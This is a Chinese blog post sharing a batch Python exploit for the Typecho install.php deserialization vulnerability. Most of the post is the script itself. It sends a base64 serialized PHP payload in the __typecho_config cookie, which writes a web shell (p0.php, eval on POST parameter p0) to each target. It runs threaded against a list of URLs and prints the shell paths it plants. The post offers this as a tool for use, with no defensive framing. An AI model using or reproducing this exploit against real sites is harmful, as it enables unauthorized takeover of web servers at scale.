      <p>来自<a href="http://exp10it.tk/2017/11/05/typecho-exploit/" target="_blank" rel="external">@X1r0z</a> 大佬的批量Python小脚本<br>工具没什么亮点, 支持批量而已。<br><a href="http://www.chabug.org/2017/11/03/typecho-install/">漏洞详情请看这里</a></p>
<p>生成地址 domain/p0.php 密码 p0<br>**Usage:</p>
<p>  typecho.py url</p>
<p>  typecho.py url.txt**<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">lock = threading.RLock()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span><span class="params">(u)</span>:</span></div><div class="line"></div><div class="line">    url = u + <span class="string">'/install.php?finish=1'</span></div><div class="line">    payload =  <span class="string">'YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ=='</span></div><div class="line">    lock.acquire()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        r = requests.get(url,cookies=&#123;<span class="string">'__typecho_config'</span>:payload&#125;,headers=&#123;<span class="string">'Referer'</span>:url&#125;)</div><div class="line">        <span class="keyword">if</span> r.status_code == <span class="number">500</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'[+] Shell: '</span> + u + <span class="string">'/p0.php '</span> + <span class="string">'Pass: p0'</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'[-] Failed'</span></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'[-] Connect Error'</span></div><div class="line">    lock.release()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line">    <span class="keyword">print</span> <span class="string">'[*] Exploit for Typecho'</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'[*] usage:'</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'    typecho.py url'</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'    typecho.py url.txt'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> len(sys.argv)&lt;<span class="number">2</span>:</div><div class="line">        usage()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">if</span> sys.argv[<span class="number">1</span>].split(<span class="string">'.'</span>)[<span class="number">-1</span>] == <span class="string">'txt'</span>:</div><div class="line">            <span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</div><div class="line">                list = f.read().split(<span class="string">'\n'</span>)</div><div class="line">            <span class="keyword">for</span> u <span class="keyword">in</span> list:</div><div class="line">                t = threading.Thread(target=attack,args=(u,))</div><div class="line">                t.start()</div><div class="line">            t.join()</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            attack(sys.argv[<span class="number">1</span>])</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
